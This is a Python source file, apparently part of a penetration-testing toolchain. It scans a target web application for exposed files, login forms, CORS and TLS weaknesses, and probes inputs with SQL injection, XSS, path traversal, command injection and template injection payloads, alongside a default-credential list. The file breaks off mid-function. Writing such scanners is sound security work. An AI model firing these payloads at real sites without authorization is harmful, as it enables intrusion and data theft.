"""
skg-web-toolchain :: collector.py

Active web application collector. Does its own recon — no external tools.
Probes targets directly via raw HTTP and emits SKG envelope events for
each wicket observation.

Phases:
  1. Service fingerprint — ports, headers, server software, TLS
  2. Path discovery — common sensitive paths, directory listings
  3. Input surface mapping — forms, parameters, API endpoints
  4. Injection probing — SQLi, XSS, path traversal, command injection, SSTI

Usage:
  python collector.py --target http://192.168.1.50 \\
                      --out /tmp/events.ndjson \\
                      --attack-path-id web_sqli_to_shell_v1 \\
                      [--proxy socks5://127.0.0.1:1080] \\
                      [--run-id <uuid>] [--workload-id <name>]
"""

import argparse
import json
import uuid
import re
import time
import html.parser
from pathlib import Path
from datetime import datetime, timezone
from urllib.parse import urlparse, urljoin, urlencode, parse_qs
from typing import Optional

from transport import HttpTransport, HttpResponse


TOOLCHAIN = "skg-web-toolchain"
SOURCE_ID = "adapter.web_active"
VERSION = "1.0.0"

# ── Evidence emission ────────────────────────────────────────────────────

def iso_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def emit(out_path: Path, wicket_id: str, status: str,
         evidence_rank: int, evidence_source_kind: str,
         pointer: str, confidence: float,
         attack_path_id: str, run_id: str, workload_id: str,
         extra_payload: dict = None):
    """Write a single envelope event to the NDJSON output."""
    now = iso_now()
    event = {
        "id": str(uuid.uuid4()),
        "ts": now,
        "type": "obs.attack.precondition",
        "source": {
            "source_id": SOURCE_ID,
            "toolchain": TOOLCHAIN,
            "version": VERSION,
        },
        "payload": {
            "wicket_id": wicket_id,
            "status": status,
            "attack_path_id": attack_path_id,
            "run_id": run_id,
            "workload_id": workload_id,
            **(extra_payload or {}),
        },
        "provenance": {
            "evidence_rank": evidence_rank,
            "evidence": {
                "source_kind": evidence_source_kind,
                "pointer": pointer,
                "collected_at": now,
                "confidence": confidence,
            },
        },
    }
    with open(out_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


# ── HTML form parser ─────────────────────────────────────────────────────

class FormParser(html.parser.HTMLParser):
    """Extract forms, inputs, and links from HTML."""

    def __init__(self):
        super().__init__()
        self.forms = []
        self.links = []
        self._current_form = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._current_form = {
                "action": a.get("action", ""),
                "method": a.get("method", "GET").upper(),
                "inputs": [],
            }
        elif tag == "input" and self._current_form is not None:
            self._current_form["inputs"].append({
                "name": a.get("name", ""),
                "type": a.get("type", "text"),
                "value": a.get("value", ""),
            })
        elif tag == "textarea" and self._current_form is not None:
            self._current_form["inputs"].append({
                "name": a.get("name", ""),
                "type": "textarea",
                "value": "",
            })
        elif tag == "select" and self._current_form is not None:
            self._current_form["inputs"].append({
                "name": a.get("name", ""),
                "type": "select",
                "value": "",
            })
        elif tag == "a" and "href" in a:
            self.links.append(a["href"])

    def handle_endtag(self, tag):
        if tag == "form" and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None


def parse_html(body: str) -> FormParser:
    p = FormParser()
    try:
        p.feed(body)
    except Exception:
        pass
    return p


# ── Phase 1: Service fingerprint ────────────────────────────────────────

# Common ports to probe if not specified
PROBE_PORTS = {
    "http": [80, 8080, 8000, 8888, 3000, 5000],
    "https": [443, 8443, 4443, 9443],
}

# Headers that leak server info
VERSION_HEADERS = [
    "server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
    "x-generator", "via", "x-drupal-cache", "x-varnish",
]

SECURITY_HEADERS = [
    "content-security-policy", "x-frame-options",
    "strict-transport-security", "x-content-type-options",
    "referrer-policy", "permissions-policy",
]

WEAK_CIPHERS = {"RC4", "DES", "3DES", "NULL", "EXPORT", "anon"}
WEAK_PROTOCOLS = {"SSLv2", "SSLv3", "TLSv1", "TLSv1.1"}


def phase1_fingerprint(transport: HttpTransport, base_url: str,
                       out: Path, attack_path_id: str,
                       run_id: str, workload_id: str) -> dict:
    """
    Phase 1: Service fingerprint.
    Returns context dict with discovered info for subsequent phases.
    """
    ctx = {
        "base_url": base_url,
        "server": None,
        "technologies": [],
        "version_headers": {},
        "missing_security_headers": [],
        "tls_info": None,
        "reachable": False,
    }

    parsed = urlparse(base_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    # ── WB-01: Service reachable ──
    resp = transport.request_follow("GET", base_url)
    if resp.error:
        emit(out, "WB-01", "blocked", 1, "runtime",
             f"tcp://{host}:{port}", 0.95,
             attack_path_id, run_id, workload_id,
             {"detail": f"Connection failed: {resp.error}"})
        return ctx

    ctx["reachable"] = True
    # Track where we actually landed after redirects
    landing_url = getattr(resp, 'redirect_chain', [base_url])[-1] if hasattr(resp, 'redirect_chain') and resp.redirect_chain else base_url
    if landing_url != base_url:
        ctx["landing_url"] = landing_url
    emit(out, "WB-01", "realized", 1, "runtime",
         f"tcp://{host}:{port}", 1.0,
         attack_path_id, run_id, workload_id,
         {"detail": f"HTTP {resp.status} in {resp.elapsed_ms:.0f}ms" +
          (f" (redirected to {landing_url})" if landing_url != base_url else "")})

    # ── WB-02: Server version disclosed ──
    disclosed = {}
    for hdr in VERSION_HEADERS:
        val = resp.header(hdr)
        if val:
            disclosed[hdr] = val

    if disclosed:
        ctx["version_headers"] = disclosed
        ctx["server"] = disclosed.get("server", "")
        emit(out, "WB-02", "realized", 1, "runtime",
             f"{base_url} response headers", 0.95,
             attack_path_id, run_id, workload_id,
             {"detail": json.dumps(disclosed)})
    else:
        emit(out, "WB-02", "blocked", 1, "runtime",
             f"{base_url} response headers", 0.8,
             attack_path_id, run_id, workload_id,
             {"detail": "No version-disclosing headers found"})

    # ── WB-19: Security headers missing ──
    missing = []
    for hdr in SECURITY_HEADERS:
        if not resp.header(hdr):
            missing.append(hdr)
    ctx["missing_security_headers"] = missing

    if missing:
        emit(out, "WB-19", "realized", 1, "runtime",
             f"{base_url} response headers", 0.9,
             attack_path_id, run_id, workload_id,
             {"detail": f"Missing: {', '.join(missing)}"})
    else:
        emit(out, "WB-19", "blocked", 1, "runtime",
             f"{base_url} response headers", 0.85,
             attack_path_id, run_id, workload_id,
             {"detail": "All checked security headers present"})

    # ── WB-18: CORS misconfigured ──
    cors_resp = transport.request("GET", base_url,
                                  headers={"Origin": "https://evil.example.com"})
    acao = cors_resp.header("access-control-allow-origin")
    acac = cors_resp.header("access-control-allow-credentials")

    if acao and ("evil.example.com" in acao or acao == "*"):
        status = "realized"
        conf = 0.9 if acac.lower() == "true" else 0.7
        detail = f"ACAO={acao}, ACAC={acac}"
    else:
        status = "blocked"
        conf = 0.75
        detail = f"ACAO={acao or 'absent'}"

    emit(out, "WB-18", status, 1, "runtime",
         f"{base_url} CORS probe", conf,
         attack_path_id, run_id, workload_id,
         {"detail": detail})

    # ── WB-17: TLS misconfigured ──
    if parsed.scheme == "https":
        tls = transport.get_tls_info(host, port)
        ctx["tls_info"] = tls

        if tls.get("error"):
            emit(out, "WB-17", "unknown", 1, "runtime",
                 f"tls://{host}:{port}", 0.5,
                 attack_path_id, run_id, workload_id,
                 {"detail": f"TLS probe error: {tls['error']}"})
        else:
            issues = []
            cipher_name = tls.get("cipher_name", "")
            tls_ver = tls.get("tls_version", "")
            bits = tls.get("cipher_bits", 0)

            if any(w in cipher_name.upper() for w in WEAK_CIPHERS):
                issues.append(f"weak cipher: {cipher_name}")
            if tls_ver in WEAK_PROTOCOLS:
                issues.append(f"weak protocol: {tls_ver}")
            if bits and bits < 128:
                issues.append(f"low bit strength: {bits}")

            # Check cert validity
            not_after = tls.get("notAfter", "")
            if not_after:
                try:
                    from email.utils import parsedate_to_datetime
                    expiry = parsedate_to_datetime(not_after)
                    if expiry < datetime.now(timezone.utc):
                        issues.append("certificate expired")
                except Exception:
                    pass

            issuer = tls.get("issuer", {})
            if issuer.get("organizationName", "").lower() in ("", "self-signed"):
                issues.append("self-signed certificate")
            subject_cn = tls.get("subject", {}).get("commonName", "")
            if subject_cn and subject_cn != host and not subject_cn.startswith("*"):
                issues.append(f"CN mismatch: {subject_cn} vs {host}")

            if issues:
                emit(out, "WB-17", "realized", 1, "runtime",
                     f"tls://{host}:{port}", 0.85,
                     attack_path_id, run_id, workload_id,
                     {"detail": "; ".join(issues)})
            else:
                emit(out, "WB-17", "blocked", 1, "runtime",
                     f"tls://{host}:{port}", 0.8,
                     attack_path_id, run_id, workload_id,
                     {"detail": f"{tls_ver}, {cipher_name}, {bits}bit"})
    else:
        # Plain HTTP — no TLS to check, but that itself is a finding
        emit(out, "WB-17", "realized", 1, "runtime",
             f"http://{host}:{port}", 0.7,
             attack_path_id, run_id, workload_id,
             {"detail": "Service runs over plain HTTP, no TLS"})

    return ctx


# ── Phase 2: Path discovery ──────────────────────────────────────────────

# Paths to probe, grouped by what they indicate
SENSITIVE_PATHS = [
    # Source / config disclosure
    ("/.git/HEAD", "git_repo"),
    ("/.git/config", "git_config"),
    ("/.env", "env_file"),
    ("/.env.bak", "env_backup"),
    ("/config.php.bak", "config_backup"),
    ("/web.config", "iis_config"),
    ("/wp-config.php.bak", "wp_config_backup"),
    ("/config/database.yml", "rails_db_config"),
    ("/.htaccess", "htaccess"),
    ("/.htpasswd", "htpasswd"),
    ("/crossdomain.xml", "crossdomain"),

    # Admin / management
    ("/admin", "admin_panel"),
    ("/admin/", "admin_panel"),
    ("/administrator", "admin_panel"),
    ("/wp-admin", "wp_admin"),
    ("/wp-login.php", "wp_login"),
    ("/phpmyadmin", "phpmyadmin"),
    ("/phpmyadmin/", "phpmyadmin"),
    ("/manager/html", "tomcat_manager"),
    ("/console", "console"),
    ("/actuator", "spring_actuator"),
    ("/actuator/env", "spring_env"),
    ("/api/swagger-ui.html", "swagger"),
    ("/swagger-ui/", "swagger"),
    ("/api-docs", "api_docs"),

    # Backup / data leak
    ("/backup/", "backup_dir"),
    ("/backups/", "backup_dir"),
    ("/dump.sql", "sql_dump"),
    ("/database.sql", "sql_dump"),
    ("/db.sql", "sql_dump"),

    # Info disclosure
    ("/robots.txt", "robots"),
    ("/sitemap.xml", "sitemap"),
    ("/server-status", "apache_status"),
    ("/server-info", "apache_info"),
    ("/phpinfo.php", "phpinfo"),
    ("/info.php", "phpinfo"),
    ("/elmah.axd", "elmah"),
    ("/trace.axd", "trace"),
]

DIRLIST_PATTERNS = [
    re.compile(r"Index of /", re.IGNORECASE),
    re.compile(r"Parent Directory", re.IGNORECASE),
    re.compile(r"<title>Directory listing", re.IGNORECASE),
    re.compile(r"\[To Parent Directory\]", re.IGNORECASE),
]


def phase2_paths(transport: HttpTransport, ctx: dict,
                 out: Path, attack_path_id: str,
                 run_id: str, workload_id: str) -> dict:
    """
    Phase 2: Path discovery.
    Probes common sensitive paths and checks for directory listing.
    """
    base = ctx["base_url"].rstrip("/")
    found_sensitive = []
    found_dirlist = False
    robots_content = ""
    sitemap_content = ""

    for path, category in SENSITIVE_PATHS:
        url = base + path
        resp = transport.request("GET", url)

        if resp.error or resp.status in (0, 404, 403, 405, 500):
            continue

        if resp.status in (200, 301, 302):
            # Filter false positives: soft 404s that return 200 with generic content
            if resp.status == 200 and len(resp.body) < 50:
                continue

            found_sensitive.append({
                "path": path,
                "category": category,
                "status": resp.status,
                "size": len(resp.body),
            })

            # Check for directory listing
            if not found_dirlist:
                for pat in DIRLIST_PATTERNS:
                    if pat.search(resp.text):
                        found_dirlist = True
                        break

            # Capture robots/sitemap content for later analysis
            if category == "robots":
                robots_content = resp.text
            elif category == "sitemap":
                sitemap_content = resp.text

    # ── WB-05: Sensitive paths exposed ──
    # Filter out robots.txt and sitemap.xml — those are expected to exist
    truly_sensitive = [s for s in found_sensitive
                       if s["category"] not in ("robots", "sitemap")]

    if truly_sensitive:
        paths_str = ", ".join(s["path"] for s in truly_sensitive[:10])
        emit(out, "WB-05", "realized", 1, "runtime",
             f"{base} path scan", 0.9,
             attack_path_id, run_id, workload_id,
             {"detail": f"Sensitive paths accessible: {paths_str}",
              "paths": truly_sensitive[:20]})
    else:
        emit(out, "WB-05", "blocked", 1, "runtime",
             f"{base} path scan", 0.7,
             attack_path_id, run_id, workload_id,
             {"detail": f"Probed {len(SENSITIVE_PATHS)} paths, none sensitive accessible"})

    # ── WB-04: Directory listing ──
    if found_dirlist:
        emit(out, "WB-04", "realized", 1, "runtime",
             f"{base} dirlist check", 0.9,
             attack_path_id, run_id, workload_id,
             {"detail": "Directory listing detected"})
    else:
        emit(out, "WB-04", "blocked", 1, "runtime",
             f"{base} dirlist check", 0.7,
             attack_path_id, run_id, workload_id,
             {"detail": "No directory listing detected"})

    # ── WB-24: robots.txt / sitemap disclosure ──
    hidden_paths = []
    if robots_content:
        for line in robots_content.splitlines():
            line = line.strip()
            if line.lower().startswith("disallow:"):
                p = line.split(":", 1)[1].strip()
                if p and p != "/":
                    hidden_paths.append(p)
    if sitemap_content:
        # Extract URLs from sitemap
        for m in re.finditer(r"<loc>(.*?)</loc>", sitemap_content):
            hidden_paths.append(m.group(1))

    if hidden_paths:
        emit(out, "WB-24", "realized", 1, "runtime",
             f"{base}/robots.txt or /sitemap.xml", 0.85,
             attack_path_id, run_id, workload_id,
             {"detail": f"Disclosed paths: {', '.join(hidden_paths[:15])}",
              "hidden_paths": hidden_paths[:50]})
    else:
        emit(out, "WB-24", "unknown", 1, "runtime",
             f"{base}/robots.txt or /sitemap.xml", 0.5,
             attack_path_id, run_id, workload_id,
             {"detail": "No robots.txt/sitemap or no hidden paths"})

    ctx["sensitive_paths"] = found_sensitive
    ctx["hidden_paths"] = hidden_paths
    return ctx


# ── Phase 3: Input surface mapping ──────────────────────────────────────

def phase3_inputs(transport: HttpTransport, ctx: dict,
                  out: Path, attack_path_id: str,
                  run_id: str, workload_id: str) -> dict:
    """
    Phase 3: Map input surfaces — forms, URL params, API endpoints.
    """
    base = ctx["base_url"].rstrip("/")

    # Collect pages to analyze: base URL + landing URL + any discovered paths that returned HTML
    pages_to_scan = [base + "/"]
    landing = ctx.get("landing_url")
    if landing and landing not in pages_to_scan:
        pages_to_scan.insert(0, landing)  # Prioritize where we actually landed
    for sp in ctx.get("sensitive_paths", []):
        if sp["category"] in ("admin_panel", "wp_login", "console", "swagger"):
            pages_to_scan.append(base + sp["path"])
    for hp in ctx.get("hidden_paths", [])[:20]:
        if hp.startswith("/"):
            pages_to_scan.append(base + hp)
        elif hp.startswith("http"):
            pages_to_scan.append(hp)

    all_forms = []
    all_links = []
    all_params = set()
    login_found = False
    api_endpoints = []

    seen_urls = set()
    for page_url in pages_to_scan[:30]:
        if page_url in seen_urls:
            continue
        seen_urls.add(page_url)

        resp = transport.request_follow("GET", page_url)
        if resp.error or resp.status not in (200,):
            continue

        content_type = resp.header("content-type", "")
        if "html" not in content_type and "json" not in content_type:
            continue

        if "html" in content_type:
            parsed = parse_html(resp.text)

            for form in parsed.forms:
                form["page"] = page_url
                action = form["action"]
                if action:
                    form["resolved_action"] = urljoin(page_url, action)
                else:
                    form["resolved_action"] = page_url

                all_forms.append(form)

                # Check if this is a login form
                input_types = [i["type"].lower() for i in form["inputs"]]
                input_names = [i["name"].lower() for i in form["inputs"]]
                if "password" in input_types or any("pass" in n for n in input_names):
                    login_found = True

                # Collect parameter names
                for inp in form["inputs"]:
                    if inp["name"]:
                        all_params.add(inp["name"])

            # Collect links for further crawling
            for link in parsed.links:
                resolved = urljoin(page_url, link)
                rp = urlparse(resolved)
                bp = urlparse(base)
                if rp.hostname == bp.hostname:
                    all_links.append(resolved)
                    if rp.query:
                        for k in parse_qs(rp.query):
                            all_params.add(k)

        # Check for unauthenticated API endpoints
        if "json" in content_type or "/api" in page_url:
            api_endpoints.append({
                "url": page_url,
                "status": resp.status,
                "content_type": content_type,
                "body_preview": resp.text[:200],
            })

    # ── WB-06: Login form present ──
    if login_found:
        login_forms = [f for f in all_forms
                       if any(i["type"] == "password" for i in f["inputs"])]
        emit(out, "WB-06", "realized", 1, "runtime",
             f"{base} form analysis", 0.95,
             attack_path_id, run_id, workload_id,
             {"detail": f"Login form(s) found on: {', '.join(f['page'] for f in login_forms[:5])}"})
    else:
        emit(out, "WB-06", "unknown", 1, "runtime",
             f"{base} form analysis", 0.5,
             attack_path_id, run_id, workload_id,
             {"detail": f"No login form found in {len(seen_urls)} pages scanned"})

    # ── WB-23: Unauthenticated API endpoints ──
    if api_endpoints:
        emit(out, "WB-23", "realized", 1, "runtime",
             f"{base} API scan", 0.8,
             attack_path_id, run_id, workload_id,
             {"detail": f"Unauthenticated API: {', '.join(e['url'] for e in api_endpoints[:5])}",
              "endpoints": api_endpoints[:10]})
    else:
        emit(out, "WB-23", "unknown", 1, "runtime",
             f"{base} API scan", 0.4,
             attack_path_id, run_id, workload_id,
             {"detail": "No API endpoints discovered"})

    ctx["forms"] = all_forms
    ctx["links"] = list(set(all_links))[:100]
    ctx["params"] = list(all_params)
    ctx["login_found"] = login_found
    ctx["api_endpoints"] = api_endpoints
    return ctx


# ── Phase 4: Injection probing ───────────────────────────────────────────

# SQLi error patterns across databases
SQLI_ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning.*mysql", re.I),
    re.compile(r"unclosed quotation mark", re.I),
    re.compile(r"microsoft.*odbc.*driver", re.I),
    re.compile(r"microsoft.*ole db.*provider", re.I),
    re.compile(r"ora-\d{5}", re.I),
    re.compile(r"pg_query\(\)", re.I),
    re.compile(r"pgsql.*error", re.I),
    re.compile(r"sqlite3?\.OperationalError", re.I),
    re.compile(r"SQL syntax.*MariaDB", re.I),
    re.compile(r"supplied argument is not a valid MySQL", re.I),
    re.compile(r"PostgreSQL.*ERROR", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"unterminated.*string.*literal", re.I),
    re.compile(r"com\.mysql\.jdbc", re.I),
    re.compile(r"org\.postgresql\.util\.PSQLException", re.I),
    re.compile(r"java\.sql\.SQLException", re.I),
]

# XSS reflection check
XSS_CANARY = "skg7x7x7"
XSS_PAYLOADS = [
    f'"{XSS_CANARY}<>',
    f"'{XSS_CANARY}<>",
    f"<{XSS_CANARY}>",
]

# Path traversal payloads
TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd", "root:"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("....//....//....//etc/passwd", "root:"),
    ("/etc/passwd", "root:"),
]

# Command injection: time-based detection
CMDI_PAYLOADS = [
    ("; sleep 5", 5.0),
    ("| sleep 5", 5.0),
    ("&& sleep 5", 5.0),
    ("$(sleep 5)", 5.0),
    ("`sleep 5`", 5.0),
    # Windows
    ("& ping -n 6 127.0.0.1 &", 5.0),
    ("| ping -n 6 127.0.0.1", 5.0),
]

# SSTI payloads
SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("#{7*7}", "49"),
]

# Verbose error patterns
VERBOSE_ERROR_PATTERNS = [
    re.compile(r"Traceback \(most recent call", re.I),
    re.compile(r"<b>Fatal error</b>:", re.I),
    re.compile(r"<b>Warning</b>:.*on line", re.I),
    re.compile(r"at\s+[\w.]+\.java:\d+", re.I),
    re.compile(r"Microsoft\.AspNet", re.I),
    re.compile(r"stack trace:", re.I),
    re.compile(r"Debug mode.*SECURITY WARNING", re.I),
    re.compile(r"Werkzeug.*Debugger", re.I),
    re.compile(r"Django.*Debug.*True", re.I),
]

# Common default credential pairs
DEFAULT_CREDS = [
    # DVWA
    ("admin",         "password"),
    # Common defaults
    ("admin",         "admin"),
    ("admin",         "admin123"),
    ("admin",         "123456"),
    ("admin",         "letmein"),
    ("admin",         "welcome"),
    ("admin",         "1234"),
    ("root",          "root"),
    ("root",          "toor"),
    ("root",          "password"),
    ("test",          "test"),
    ("guest",         "guest"),
    ("user",          "user"),
    ("user",          "password"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    # Web app frameworks
    ("admin",         "Pass1234"),
    ("admin",         "Admin1234"),
    ("operator",      "operator"),
    ("demo",          "demo"),
    ("pi",            "raspberry"),
]


def _get_baseline(transport: HttpTransport, url: str) -> HttpResponse:
    """Get a baseline response for comparison."""
    return transport.request("GET", url)


def _test_sqli_param(transport: HttpTransport, url: str, method: str,
                     param_name: str, base_value: str = "1") -> dict:
    """
    Test a single parameter for SQL injection.
    Returns dict with findings or empty dict.
    """
    results = {"error_based": False, "boolean_based": False,
               "time_based": False, "detail": ""}

    parsed = urlparse(url)

    def send_payload(payload):
        if method == "GET":
            test_url = url + ("&" if "?" in url else "?") + urlencode({param_name: payload})
            return transport.request("GET", test_url)
        else:
            body = urlencode({param_name: payload}).encode()
            return transport.request("POST", url,
                                     headers={"Content-Type": "application/x-www-form-urlencoded"},
                                     body=body)

    # Error-based: send a single quote
    resp = send_payload(base_value + "'")
    if not resp.error:
        for pat in SQLI_ERROR_PATTERNS:
            if pat.search(resp.text):
                results["error_based"] = True
                results["detail"] = f"SQL error on quote injection: {pat.pattern[:50]}"
                break

    # Boolean-based: compare true vs false conditions
    resp_true = send_payload(base_value + "' OR '1'='1")
    resp_false = send_payload(base_value + "' OR '1'='2")
    if not resp_true.error and not resp_false.error:
        if (resp_true.status == resp_false.status and
                len(resp_true.body) != len(resp_false.body) and
                abs(len(resp_true.body) - len(resp_false.body)) > 20):
            results["boolean_based"] = True
            results["detail"] += f" Boolean diff: {len(resp_true.body)} vs {len(resp_false.body)} bytes."

    # Time-based: sleep injection
    resp_normal = send_payload(base_value)
    if not resp_normal.error:
        normal_time = resp_normal.elapsed_ms
        resp_sleep = send_payload(base_value + "' OR SLEEP(3)-- -")
        if not resp_sleep.error:
            if resp_sleep.elapsed_ms > normal_time + 2500:
                results["time_based"] = True
                results["detail"] += f" Time-based: {resp_sleep.elapsed_ms:.0f}ms vs {normal_time:.0f}ms."

    return results


def phase4_inject(transport: HttpTransport, ctx: dict,
                  out: Path, attack_path_id: str,
                  run_id: str, workload_id: str) -> dict:
    """
    Phase 4: Injection probing.
    Tests discovered input points for SQLi, XSS, traversal, CMDI, SSTI.
    """
    base = ctx["base_url"].rstrip("/")
    forms = ctx.get("forms", [])
    sqli_found = False
    xss_found = False
    traversal_found = False
    cmdi_found = False
    ssti_found = False
    verbose_errors = False

    # ── WB-03: Verbose error pages ──
    # Send malformed requests to trigger errors
    error_urls = [
        base + "/'",
        base + "/%00",
        base + "/~",
        base + "/?id='",
    ]
    for eurl in error_urls:
        resp = transport.request("GET", eurl)
        if resp.error:
            continue
        for pat in VERBOSE_ERROR_PATTERNS:
            if pat.search(resp.text):
                verbose_errors = True
                emit(out, "WB-03", "realized", 1, "runtime",
                     eurl, 0.9,
                     attack_path_id, run_id, workload_id,
                     {"detail": f"Verbose error triggered at {eurl}"})
                break
        if verbose_errors:
            break

    if not verbose_errors:
        emit(out, "WB-03", "blocked", 1, "runtime",
             f"{base} error probe", 0.7,
             attack_path_id, run_id, workload_id,
             {"detail": "No verbose errors triggered"})

    # ── Test each form ──
    injectable_params = []

    for form in forms:
        action_url = form.get("resolved_action", base)
        method = form.get("method", "GET")
        params = [i for i in form["inputs"] if i["name"]
                  and i["type"] not in ("submit", "hidden", "button")]

        for param in params:
            pname = param["name"]

            # SQLi test
            sqli_result = _test_sqli_param(transport, action_url, method, pname)
            if any([sqli_result["error_based"], sqli_result["boolean_based"],
                    sqli_result["time_based"]]):
                sqli_found = True
                injectable_params.append({
                    "param": pname,
                    "url": action_url,
                    "method": method,
                    "sqli": sqli_result,
                })

            # XSS test — check reflection
            for payload in XSS_PAYLOADS:
                if method == "GET":
                    test_url = action_url + ("&" if "?" in action_url else "?")
                    test_url += urlencode({pname: payload})
                    resp = transport.request("GET", test_url)
                else:
                    body = urlencode({pname: payload}).encode()
                    resp = transport.request("POST", action_url,
                                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                                             body=body)
                if not resp.error and XSS_CANARY in resp.text:
                    # Check if it's reflected unescaped
                    if f"<{XSS_CANARY}>" in resp.text:
                        xss_found = True
                        break

            # SSTI test
            for payload, expected in SSTI_PAYLOADS:
                if method == "GET":
                    test_url = action_url + ("&" if "?" in action_url else "?")
                    test_url += urlencode({pname: payload})
                    resp = transport.request("GET", test_url)
                else:
                    body = urlencode({pname: payload}).encode()
                    resp = transport.request("POST", action_url,
                                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                                             body=body)
                if not resp.error and expected in resp.text and payload not in resp.text:
                    ssti_found = True
                    break

    # ── Test URL parameters from crawled links ──
    for link in ctx.get("links", [])[:30]:
        lp = urlparse(link)
        if not lp.query:
            continue
        qs = parse_qs(lp.query)
        for pname in qs:
            sqli_result = _test_sqli_param(transport, link, "GET", pname,
                                            qs[pname][0] if qs[pname] else "1")
            if any([sqli_result["error_based"], sqli_result["boolean_based"],
                    sqli_result["time_based"]]):
                sqli_found = True
                injectable_params.append({
                    "param": pname,
                    "url": link,
                    "method": "GET",
                    "sqli": sqli_result,
                })

    # ── WB-09: Injectable parameter found ──
    if sqli_found:
        detail = "; ".join(f"{p['param']}@{p['url']} ({p['sqli']['detail'][:80]})"
                           for p in injectable_params[:5])
        emit(out, "WB-09", "realized", 1, "runtime",
             f"{base} injection scan", 0.9,
             attack_path_id, run_id, workload_id,
             {"detail": detail, "injectable": injectable_params[:10]})
    else:
        emit(out, "WB-09", "unknown", 1, "runtime",
             f"{base} injection scan", 0.5,
             attack_path_id, run_id, workload_id,
             {"detail": f"Tested {len(forms)} forms + URL params, no SQLi detected"})

    # ── WB-10: SQLi data extraction (only if SQLi found) ──
    if sqli_found:
        # Attempt UNION-based extraction on the first injectable param
        ip = injectable_params[0]
        extraction_confirmed = False

        for col_count in range(1, 11):
            union_payload = f"' UNION SELECT {','.join(['NULL'] * col_count)}-- -"
            pname = ip["param"]
            url = ip["url"]

            if ip["method"] == "GET":
                test_url = url + ("&" if "?" in url else "?") + urlencode({pname: union_payload})
                resp = transport.request("GET", test_url)
            else:
                body = urlencode({pname: union_payload}).encode()
                resp = transport.request("POST", url,
                                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                                         body=body)

            if not resp.error and resp.status == 200:
                # Check if UNION succeeded (no SQL error, different from error response)
                has_sqli_error = any(p.search(resp.text) for p in SQLI_ERROR_PATTERNS)
                if not has_sqli_error and len(resp.body) > 100:
                    extraction_confirmed = True
                    emit(out, "WB-10", "realized", 1, "runtime",
                         f"{url} UNION {col_count} columns", 0.85,
                         attack_path_id, run_id, workload_id,
                         {"detail": f"UNION SELECT with {col_count} columns accepted"})
                    break

        if not extraction_confirmed:
            emit(out, "WB-10", "unknown", 1, "runtime",
                 f"{base} extraction attempt", 0.5,
                 attack_path_id, run_id, workload_id,
                 {"detail": "SQLi found but UNION extraction not confirmed"})
    else:
        emit(out, "WB-10", "unknown", 1, "runtime",
             f"{base} extraction attempt", 0.3,
             attack_path_id, run_id, workload_id,
             {"detail": "No SQLi found, extraction not attempted"})

    # ── WB-11: Reflected XSS ──
    if xss_found:
        emit(out, "WB-11", "realized", 1, "runtime",
             f"{base} XSS scan", 0.85,
             attack_path_id, run_id, workload_id,
             {"detail": "Reflected input with unescaped HTML tags"})
    else:
        emit(out, "WB-11", "unknown", 1, "runtime",
             f"{base} XSS scan", 0.4,
             attack_path_id, run_id, workload_id,
             {"detail": "No reflected XSS detected in tested parameters"})

    # ── WB-12: Path traversal ──
    # Test via URL parameters that look like file paths
    for link in ctx.get("links", [])[:20]:
        lp = urlparse(link)
        qs = parse_qs(lp.query)
        for pname, values in qs.items():
            if any(hint in pname.lower() for hint in
                   ("file", "path", "page", "doc", "template", "include", "load", "read")):
                for payload, marker in TRAVERSAL_PAYLOADS:
                    test_url = link.split("?")[0] + "?" + urlencode({pname: payload})
                    resp = transport.request("GET", test_url)
                    if not resp.error and marker in resp.text:
                        traversal_found = True
                        emit(out, "WB-12", "realized", 1, "runtime",
                             test_url, 0.9,
                             attack_path_id, run_id, workload_id,
                             {"detail": f"Path traversal via {pname}: {payload}"})
                        break
                if traversal_found:
                    break
        if traversal_found:
            break

    if not traversal_found:
        emit(out, "WB-12", "unknown", 1, "runtime",
             f"{base} traversal scan", 0.4,
             attack_path_id, run_id, workload_id,
             {"detail": "No path traversal detected"})

    # ── WB-14: Command injection (time-based) ──
    for form in forms[:5]:
        action_url = form.get("resolved_action", base)
        method = form.get("method", "GET")
        params = [i for i in form["inputs"] if i["name"]
                  and i["type"] not in ("submit", "hidden", "button", "password")]

        for param in params[:3]:
            pname = param["name"]

            # Get baseline timing
            if method == "GET":
                baseline_url = action_url + ("&" if "?" in action_url else "?") + urlencode({pname: "test"})
                resp_baseline = transport.request("GET", baseline_url)
            else:
                body = urlencode({pname: "test"}).encode()
                resp_baseline = transport.request("POST", action_url,
                                                  headers={"Content-Type": "application/x-www-form-urlencoded"},
                                                  body=body)
            if resp_baseline.error:
                continue
            baseline_ms = resp_baseline.elapsed_ms

            for payload, delay in CMDI_PAYLOADS[:3]:  # Limit to avoid noise
                if method == "GET":
                    test_url = action_url + ("&" if "?" in action_url else "?")
                    test_url += urlencode({pname: "test" + payload})
                    resp = transport.request("GET", test_url)
                else:
                    body = urlencode({pname: "test" + payload}).encode()
                    resp = transport.request("POST", action_url,
                                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                                             body=body)
                if not resp.error and resp.elapsed_ms > baseline_ms + (delay * 800):
                    cmdi_found = True
                    emit(out, "WB-14", "realized", 1, "runtime",
                         f"{action_url} param={pname}", 0.85,
                         attack_path_id, run_id, workload_id,
                         {"detail": f"Command injection via {pname}: "
                                    f"{resp.elapsed_ms:.0f}ms vs {baseline_ms:.0f}ms baseline"})
                    break
            if cmdi_found:
                break
        if cmdi_found:
            break

    if not cmdi_found:
        emit(out, "WB-14", "unknown", 1, "runtime",
             f"{base} cmdi scan", 0.4,
             attack_path_id, run_id, workload_id,
